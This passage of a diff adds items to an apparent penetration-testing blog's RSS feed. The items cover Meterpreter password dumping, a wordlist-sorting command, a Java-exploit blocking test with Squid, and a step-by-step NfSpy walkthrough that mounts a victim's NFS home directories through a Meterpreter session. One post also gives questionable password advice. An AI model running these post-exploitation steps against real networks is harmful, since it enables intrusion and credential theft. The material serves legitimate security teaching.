+&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NTAUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;
+
+&lt;p&gt; &lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-0620pm.png.06%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 06 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the available commands:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-2220pm.png.22%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 22 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And run getHashes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm202.png.04%20PM%202.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-3920pm.png.39%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 39 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Possible issues you may run into:&lt;/p&gt;
+
+&lt;p&gt;1) If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-40-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 40 29 AM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm.png.04%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2) If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/p&gt;
+
+&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Mastery @BlackHatEvents USA 2013</title>
+      <link>http://localhost:1313/post/2013/2013319metasploit-mastery-blackhatevents-usa-2013-html/</link>
+      <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013319metasploit-mastery-blackhatevents-usa-2013-html/</guid>
+      <description>&lt;p&gt;Just a quick post to say that &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt; and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us&lt;/p&gt;
+
+&lt;p&gt;Linky: &lt;a href=&#34;http://www.blackhat.com/us-13/training/metasploit-mastery.html&#34;&gt;http://www.blackhat.com/us-13/training/metasploit-mastery.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 27-28 session:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2728MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Current fill rate of July 29-30 session:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://www.blackhat.com/images/us-13/trainbars/July2930MetasploitMastery.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;EOM&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Length Sorting Wordlists</title>
+      <link>http://localhost:1313/post/2013/2013318length-sorting-wordlists-html/</link>
+      <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013318length-sorting-wordlists-html/</guid>
+      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
+
+&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
+
+&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
+
+&lt;p&gt;To do that is very simple:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mounting NFS shares through Meterpreter with NfSpy</title>
+      <link>http://localhost:1313/post/2013/201334mounting-nfs-shares-through-meterpreter-with-nfspy-html/</link>
+      <pubDate>Mon, 04 Mar 2013 21:20:19 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201334mounting-nfs-shares-through-meterpreter-with-nfspy-html/</guid>
+      <description>&lt;p&gt;You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
+
+&lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
+
+&lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
+msf auxiliary(nfsmount) &amp;gt; show options
+
+Module options (auxiliary/scanner/nfs/nfsmount):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&amp;lt;
+
+msf auxiliary(nfsmount) &amp;gt; set RHOSTS 192.168.1.50
+RHOSTS =&amp;gt; 192.168.1.50
+msf auxiliary(nfsmount) &amp;gt; run
+[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
+[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
+msf auxiliary(sunrpc_portmapper) &amp;gt; show options&lt;/p&gt;
+
+&lt;p&gt;Module options (auxiliary/scanner/misc/sunrpc_portmapper):&lt;/p&gt;
+
+&lt;p&gt;Name     Current Setting  Required  Description&amp;lt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    111              yes       The target port
+   THREADS  1                yes       The number of concurrent threads&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(sunrpc_portmapper) &amp;gt; set RHOSTS 192.168.1.50
+RHOSTS =&amp;gt; 192.168.1.50
+msf auxiliary(sunrpc_portmapper) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[+] 192.168.1.50 - Programs available
+        rpcbind - 111/tcp
+        rpcbind - 111/udp&lt;br&gt;&lt;/br&gt;        status - 46797/udp&lt;br&gt;&lt;/br&gt;        status - 55731/tcp&lt;br&gt;&lt;/br&gt;        nfs - 2049/tcp&lt;br&gt;&lt;/br&gt;        nfs_acl - 2049/tcp&lt;br&gt;&lt;/br&gt;        nfs - 2049/udp&lt;br&gt;&lt;/br&gt;        nfs_acl - 2049/udp&lt;br&gt;&lt;/br&gt;        nlockmgr - 54167/udp&lt;br&gt;&lt;/br&gt;        nlockmgr - 38216/tcp&lt;br&gt;&lt;/br&gt;        mountd - 52569/udp&lt;br&gt;&lt;/br&gt;        mountd - 37719/tcp&lt;br&gt;&lt;/br&gt;        mountd - 39099/udp&lt;br&gt;&lt;/br&gt;        mountd - 55763/tcp&lt;br&gt;&lt;/br&gt;        mountd - 37808/udp&lt;br&gt;&lt;/br&gt;        mountd - 54457/tcp&lt;br&gt;&lt;/br&gt;[&lt;em&gt;] Scanned 1 of 1 hosts (100% complete)&lt;br&gt;&lt;/br&gt;[&lt;/em&gt;] Auxiliary module execution completed&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; show options&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Module options (auxiliary/server/socks4a):&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;   Name     Current Setting  Required  Description&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   ----     ---------------  --------  -----------&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   SRVHOST  0.0.0.0          yes       The address to listen on&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   SRVPORT  1080             yes       The port to listen on.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;msf auxiliary(socks4a) &amp;gt; set SRVPORT 9050&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;SRVPORT =&amp;gt; 9050&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; set SRVHOST 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;SRVHOST =&amp;gt; 127.0.0.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;msf auxiliary(socks4a) &amp;gt; run&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Auxiliary module execution completed&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] Starting the socks4a proxy server&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
+
+&lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;ProxyChains-3.1 (http://proxychains.sf.net)&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;FUSE library version: 2.8.6&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;nullpath_ok: 0&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 1, opcode: INIT (26), nodeid: 0, insize: 56&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;INIT: 7.16&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;flags=0x0000007b&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;max_readahead=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:37719-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:2049-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   INIT: 7.12&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   flags=0x00000011&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   max_readahead=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   max_write=0x00020000&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 1, success, outsize: 40&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
+
+&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ls /root/nfspy/mount&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 166, success, outsize: 32&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;readdir[0] from 0&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 167, success, outsize: 208&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user3&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 40&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 168, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 41&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 169, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user4&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 42&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 170, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;LOOKUP /home/user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;getattr /home/user2&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   NODEID: 43&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;   unique: 171, success, outsize: 144&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.&lt;/p&gt;
+
+&lt;p&gt;Last note, you can&amp;rsquo;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&amp;rsquo;s another fuse issue. If anyone has a better way to do this I&amp;rsquo;m all ears.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Suggestions on what to do when a service you use gets compromised</title>
+      <link>http://localhost:1313/post/2013/201332suggestions-on-what-to-do-when-a-service-you-use-gets-compro-html/</link>
+      <pubDate>Sat, 02 Mar 2013 21:02:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/201332suggestions-on-what-to-do-when-a-service-you-use-gets-compro-html/</guid>
+      <description>&lt;p&gt;It seems like every week there is a new compromise of some service or another. But as a user what are you supposed to do with this knowledge? Here are some suggestions on things to do or think about when reacting:&lt;/p&gt;
+
+&lt;p&gt;Do you use the password you use there anywhere else?&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Think about starting to use a password manager like LastPass, 1Password, KeePass, or a product like Yubico. This way you can very easily use different passwords for different sites.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Sit down and and start changing every where you use that password. Not just web sites, any machines (your work account) or applications are also possible targets. Start with the sites, machines, and applications that are most sensitive to you.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;It&amp;rsquo;s ok to have a hand written list of passwords for sites. One of my favorite suggestions is to take your drivers license or business card and generate passwords by using every X character on the license and base the X number on the how many letters are in the website. So you use every 6th character for Google.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;It is NOT ok to store your passwords for anything in a Excel, Word or Text document. These are easy pickings for hackers and almost always targeted.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Again, think about using a password manager&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Do NOT change your password on the affected site or service immediately. You may never know the extent of the compromise but if the company says anything to the effect of &amp;ldquo;still under investigation&amp;rdquo; or &amp;ldquo;preliminary results&amp;rdquo;, there is a chance that the attacker has also compromised the password reset mechanism so changing your password would just give the attacker the new one you have elected.&lt;/p&gt;
+
+&lt;p&gt;Do NOT stop using the service, if they have made it public that they were compromised, especially if they come out with the information first, the company is one of the few that take their dedication to their users seriously. If anything it&amp;rsquo;s a positive (that they came out and said something, not that they were compromised). Very few companies are open about such things as it happens much more often than people want to admit to.&lt;/p&gt;
+
+&lt;p&gt;Got other suggestions for people on how to handle such news? Leave a comment and I&amp;rsquo;ll include it in the main post with attribution.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Blocking Java Exploits, Malicious Signed Applets, and 0days</title>
+      <link>http://localhost:1313/post/2013/2013227blocking-java-exploits-malicious-signed-applets-and-0days-html/</link>
+      <pubDate>Wed, 27 Feb 2013 15:42:54 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013227blocking-java-exploits-malicious-signed-applets-and-0days-html/</guid>
+      <description>&lt;p&gt;The following has been a concept for me for a long time and recently I tweeted the idea which really put me under the fire to prove it. (re: justanidea hashtag)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_110240.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And a few people came up with some very valid points:&lt;/p&gt;
+
+&lt;p&gt;1) Doesn&amp;rsquo;t work so well with HTTPS sites&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;He&amp;rsquo;s right, but that forces the attack to use SSL, and doing so can yield the defender more information about the attacker, and offer other avenues of defense.&lt;/p&gt;
+
+&lt;p&gt;2) Cant an attack just spoof the user-agent?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103822.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and a response:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105445.png&#34; alt=&#34;&#34; /&gt;But in actuality that setting is applied inside the Java code, which needs to be requested by Java first. Using it&amp;rsquo;s User-Agent string. There are probably ways to get this done with Java script or other methods of loading the Java classes/jars but I haven&amp;rsquo;t been able to find any.&lt;/p&gt;
+
+&lt;p&gt;and finally 3) Whitelisting is a myth!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103738.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which goes along with phoobar&amp;rsquo;s responses as well:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105906.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yes, there will definitely be challenge when implementing blocking java user agents, and one of the biggest pit falls is that there is no clear indicators to a user that that&amp;rsquo;s the reason for the block. There are ways to make it more evident with custom proxy error pages, but it is a thorn in this solution.&lt;/p&gt;
+
+&lt;p&gt;On to the walking of the walk. Oddly enough there is little to no documentation on blocking or even detecting outbound user-agent strings. But I did happen across an excellent post about how to use Squid to block IE (which I&amp;rsquo;m all for! ;-):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://gaugusch.at/squid.shtml&#34;&gt;http://gaugusch.at/squid.shtml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The following is just my testing of his walk-through converted to be used to block java:&lt;/p&gt;
+
+&lt;p&gt;I used pfSense for my testing since it&amp;rsquo;s very easy to set up and already has Squid as a package:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_094251.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You get the point.&lt;/p&gt;
+
+&lt;p&gt;We set up the latest Java 0day in Metasploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Get the user to go to our malicious web site:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the user doesn&amp;rsquo;t see anything. This can be modified in the module. You also see that I was using &amp;ldquo;Intranet&amp;rdquo; IP space so some IE settings were lower, but nothing that would effect this exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103042.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And shell! I want to pull your attention to that YWpdDan.jar request though. That request actually is done by Java with the following user-agent:&lt;/p&gt;
+
+&lt;p&gt;&amp;ldquo;Mozilla/4.0 (Windows XP 5.1) Java/1.7.0_09&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;Alright, so the exploit works, but how about the solution? In pfSense you have the ability to slam &amp;ldquo;Custom Options&amp;rdquo; into the bottom of pfSense&amp;rsquo;s Squid config page. Like so:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103321.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is probably a better regex for selecting only Java user-agents, but this worked for now, and I don&amp;rsquo;t think any browsers actually use &amp;ldquo;Java&amp;rdquo; in their user-agents. (UPDATE: Searching for &amp;ldquo;site:useragentstring.com java&amp;rdquo; on google only yielded Java, and YACYBOT, which is built on java as using the string &amp;ldquo;Java&amp;rdquo; in their agents)&lt;/p&gt;
+
+&lt;p&gt;You can also notice that I&amp;rsquo;ve whitelisted webex.com and java.com sites and subdomains so that my &amp;ldquo;users&amp;rdquo; won&amp;rsquo;t get blocked using the tools on those sites. This could be pretty hefty with (as phoobar said) a Java dev group. But after the initial push and getting a semi &amp;ldquo;required&amp;rdquo; list of external approved sites this list shouldn&amp;rsquo;t need much upgrading, even for large organizations.&lt;/p&gt;
+
+&lt;p&gt;Save the config and let&amp;rsquo;s see how this works out:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103413.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, but did the attacker still get a shell?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_103419.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nope! Win!&lt;/p&gt;
+
+&lt;p&gt;Just to prove that HTTPS isn&amp;rsquo;t fixed here lets set those options up in Metasploit and kick the same exploit:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105028.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And after an error about a self-signed cert (notice the SSLCert option in Metasploit that has the ability to solve that as well) we get the expected result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105054.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And subsequent shell without any indication in Squid&amp;rsquo;s proxy logs of a Java user-agent:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/02/2013-02-27_105135.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, sort of a long post but hopefully something that people can use. Thanks!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; I&amp;rsquo;m not exactly certain how this affects Java &amp;ldquo;Web Start&amp;rdquo; weblet exploits if at all.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Compile NFSShell on Ubuntu</title>
+      <link>http://localhost:1313/post/2013/2013222compile-nfsshell-on-ubuntu-html/</link>
+      <pubDate>Fri, 22 Feb 2013 20:36:02 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013222compile-nfsshell-on-ubuntu-html/</guid>
